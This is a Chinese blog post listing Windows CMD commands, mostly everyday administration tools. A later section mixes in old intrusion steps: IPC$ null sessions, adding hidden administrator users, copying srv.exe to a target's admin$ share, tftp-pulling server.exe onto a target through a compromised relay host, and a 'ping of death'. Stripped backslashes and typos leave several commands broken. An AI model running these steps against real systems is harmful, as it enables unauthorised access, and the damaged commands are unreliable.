---
layout: post
title: "CMD操作命令和Linux命令大全收集"
date:   2022-01-21
tags: [net,文件,msc,exe,ip]
comments: true
author: admin
---
# CMD操作命令和Linux命令大全收集

本资源文件收集了CMD命令和Linux命令的详细列表，涵盖了Windows和Linux系统中常用的命令及其用法。无论你是系统管理员、开发人员还是普通用户，这些命令都能帮助你更高效地管理和操作计算机系统。

## CMD命令大全

### 基本命令
1. `gpedit.msc` - 组策略
2. `sndrec32` - 录音机
3. `Nslookup` - IP地址侦测器
4. `explorer` - 打开资源管理器
5. `logoff` - 注销命令
6. `shutdown` - 60秒倒计时关机命令
7. `lusrmgr.msc` - 本机用户和组
8. `services.msc` - 本地服务设置
9. `oobe/msoobe /a` - 检查XP是否激活
10. `notepad` - 打开记事本
11. `cleanmgr` - 垃圾整理
12. `net start messenger` - 开始信使服务
13. `compmgmt.msc` - 计算机管理
14. `net stop messenger` - 停止信使服务
15. `conf` - 启动netmeeting
16. `dvdplay` - DVD播放器
17. `charmap` - 启动字符映射表
18. `diskmgmt.msc` - 磁盘管理实用程序
19. `calc` - 启动计算器
20. `dfrg.msc` - 磁盘碎片整理程序
21. `chkdsk.exe` - Chkdsk磁盘检查
22. `devmgmt.msc` - 设备管理器
23. `regsvr32 /u *.dll` - 停止dll文件运行
24. `drwtsn32` - 系统医生
25. `rononce -p` - 15秒关机
26. `dxdiag` - 检查DirectX信息
27. `regedt32` - 注册表编辑器
28. `Msconfig.exe` - 系统配置实用程序
29. `rsop.msc` - 组策略结果集
30. `mem.exe` - 显示内存使用情况
31. `regedit.exe` - 注册表
32. `winchat` - XP自带局域网聊天
33. `progman` - 程序管理器
34. `winmsd` - 系统信息
35. `perfmon.msc` - 计算机性能监测程序
36. `winver` - 检查Windows版本
37. `sfc /scannow` - 扫描错误并复原
38. `taskmgr` - 任务管理器
39. `regsvr32 /u *.dll` - 停止dll文件运行
40. `wmimgmt.msc` - 打开windows管理体系结构（WMI）
41. `wupdmgr` - windows更新程序
42. `wscript` - windows脚本宿主设置
43. `write` - 写字板
45. `wiaacmgr` - 扫描仪和照相机向导
46. `winchat` - XP自带局域网聊天
49. `mplayer2` - 简易widnows media player
50. `mspaint` - 画图板
51. `mstsc` - 远程桌面连接
53. `magnify` - 放大镜实用程序
54. `mmc` - 打开控制台
55. `mobsync` - 同步命令
57. `iexpress` - 木马捆绑工具，系统自带
58. `fsmgmt.msc` - 共享文件夹管理器
59. `utilman` - 辅助工具管理器
61. `dcomcnfg` - 打开系统组件服务
62. `ddeshare` - 打开DDE共享设置
63. `osk` - 打开屏幕键盘
64. `odbcad32` - ODBC数据源管理器
65. `oobe/msoobe /a` - 检查XP是否激活
66. `cmd.exe` - CMD命令提示符
67. `regsvr32 /u zipfldr.dll` - 取消ZIP支持
68. `ntbackup` - 系统备份和还原
69. `narrator` - 屏幕“讲述人”
70. `ntmsmgr.msc` - 移动存储管理器
71. `ntmsoprq.msc` - 移动存储管理员操作请求
72. `netstat -an` - (TC)命令检查接口
73. `syncapp` - 创建一个公文包
74. `sysedit` - 系统配置编辑器
75. `sigverif` - 文件签名验证程序
76. `ciadv.msc` - 索引服务程序
77. `shrpubw` - 创建共享文件夹
78. `secpol.msc` - 本地安全策略
79. `syskey` - 系统加密，一旦加密就不能解开，保护windows xp系统的双重密码
80. `services.msc` - 本地服务设置
81. `Sndvol32` - 音量控制程序
82. `sfc.exe` - 系统文件检查器
83. `sfc /scannow` - windows文件保护
84. `ciadv.msc` - 索引服务程序
85. `tourstart` - xp简介（安装完成后出现的漫游xp程序）
86. `taskmgr` - 任务管理器
87. `eventvwr` - 事件查看器
88. `eudcedit` - 造字程序
89. `compmgmt.msc` - 计算机管理
90. `packager` - 对象包装程序
91. `perfmon.msc` - 计算机性能监测程序
92. `charmap` - 启动字符映射表
93. `cliconfg` - SQL SERVER 客户端网络实用程序
94. `Clipbrd` - 剪贴板查看器
95. `conf` - 启动netmeeting
96. `certmgr.msc` - 证书管理实用程序

### 操作详解
- `net use ipipc$ /user:` - 建立IPC空链接
- `net use ipipc$ 密码 /user:用户名` - 建立IPC非空链接
- `net use h: ipc$ 密码 /user:用户名` - 直接登陆后映射对方C：到本地为H:
- `net use h: ipc$` - 登陆后映射对方C：到本地为H:
- `net use ipipc$ /del` - 删除IPC链接
- `net use h: /del` - 删除映射对方到本地的为H：的映射
- `net user 用户名 密码 /add` - 建立用户
- `net user guest /active:yes` - 激活guest用户
- `net user` - 查看有哪些用户
- `net user 帐户名` - 查看帐户的属性
- `net localgroup administrators 用户名 /add` - 把“用户”添加到管理员中使其具有管理员权限
- `net start` - 查看开启了哪些服务
- `net start 服务名` - 开启服务（如：net start telnet， net start schedule）
- `net stop 服务名` - 停止某服务
- `net time 目标ip` - 查看对方时间
- `net time 目标ip /set` - 设置本地计算机时间与“目标IP”主机的时间同步，加上参数/yes可取消确认信息
- `net view` - 查看本地局域网内开启了哪些共享
- `net view ip` - 查看对方局域网内开启了哪些共享
- `net config` - 显示系统网络设置
- `net logoff` - 断开连接的共享
- `net pause 服务名` - 暂停某服务
- `net send ip 文本信息` - 向对方发信息
- `net ver` - 局域网内正在使用的网络连接类型和信息
- `net share` - 查看本地开启的共享
- `net share ipc$` - 开启ipc$共享
- `net share ipc$ /del` - 删除ipc$共享
- `net share c$ /del` - 删除C：共享
- `net user guest 12345` - 用guest用户登陆后用将密码改为12345
- `net password 密码` - 更改系统登陆密码
- `netstat -a` - 查看开启了哪些端口，常用netstat -an
- `netstat -n` - 查看端口的网络连接情况，常用netstat -an
- `netstat -v` - 查看正在进行的工作
- `netstat -p 协议名` - 例：netstat -p tcq/ip 查看某协议使用情况
- `netstat -s` - 查看正在使用的所有协议使用情况
- `nbtstat -A ip` - 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名
- `tracert -参数 ip(或计算机名）` - 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。
- `ping ip（或域名）` - 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。
- `ping -t -l 65550 ip` - 死亡之ping（发送大于64K的文件并一直ping就成了死亡之ping）
- `ipconfig (winipcfg)` - 用于windows NT及XP(windows 95 98）查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息
- `tlist -t` - 以树行列表显示进程（为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内）
- `kill -F 进程名` - 加-F参数后强制结束某进程（为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内）
- `del -F 文件名` - 加-F参数后就可删除只读文件/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
- `del /S /Q 目录` - 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
- `move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名` - 移动文件，用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖
- `fc one.txt two.txt > 3st.txt` - 对比二个文件并把不同之处输出到3st.txt文件中，> 和> > 是重定向命令
- `at id号` - 开启已注册的某个计划任务
- `at /delete` - 停止所有计划任务，用参数/yes则不需要确认就直接停止
- `at id号 /delete` - 停止某个已注册的计划任务
- `at` - 查看所有的计划任务
- `at ip time 程序名（或一个命令） /r` - 在某时间运行对方某程序并重新启动计算机
- `finger username @host` - 查看最近有哪些用户登陆
- `telnet ip 端口` - 远和登陆服务器，默认端口为23
- `open ip` - 连接到IP（属telnet登陆后的命令）
- `telnet` - 在本机上直接键入telnet 将进入本机的telnet
- `copy 路径文件名1 路径文件名2 /y` - 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件
- `copy c:srv.exe ipadmin$` - 复制本地c:srv.exe到对方的admin下
- `copy 1st.jpg/b+2st.txt/a 3st.jpg` - 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
- `copy ipadmin$svv.exe c:` - 或：copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
- `xcopy 要复制的文件或目录树 目标地址目录名` - 复制文件和目录树，用参数/Y将不提示覆盖相同文件
- `tftp -i 自己IP（用肉机作跳板时这用肉机IP) get server.exec:server.exe` - 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送
- `tftp -i 对方IP put c:server.exe` - 登陆后，上传本地c:server.exe至主机
- `ftp ip 端口` - 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送（文本文件时）
- `route print` - 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
- `arp` - 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息
- `start 程序名或命令 /max 或/min` - 新开一个新窗口并最大化（最小化）运行某程序或命令
- `mem` - 查看cpu使用情况
- `attrib 文件名（目录名）` - 查看某文件（目录）的属性
- `attrib 文件名 -A -R -S -H 或 +A +R +S +H` - 去掉（添加）某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性
- `dir` - 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间
- `date /t 、 time /t` - 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间
- `set 指定环境变量名称=要指派给变量的字符` - 设置环境变量
- `set` - 显示当前所有的环境变量
- `set p（或其它字符）` - 显示出当前以字符p（或其它字符）开头的所有环境变量
- `pause` - 暂停批处理程序，并显示出：请按任意键继续....
- `if` - 在批处理程序中执行条件处理（更多说明见if命令及变量）
- `goto 标签` - 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
- `call 路径批处理文件名` - 从批处理程序中调用另一个批处理程序 （更多说明见call /?）
- `for` - 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
- `echo on或off` - 打开或关闭echo，仅用echo不加参数则显示当前echo设置
- `echo 信息` - 在屏幕上显示出信息
- `echo 信息 >> pass.txt` - 将信息保存到pass.txt文件中
- `findstr Hello aa.txt` - 在aa.txt文件中寻找字符串hello
- `find 文件名` - 查找某文件
- `title 标题名字` - 更改CMD窗口标题名字
- `color 颜色值` - 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=

## 下载链接

[CMD操作命令和Linux命令大全收集](https://pan.quark.cn/s/59bf4e5209c5)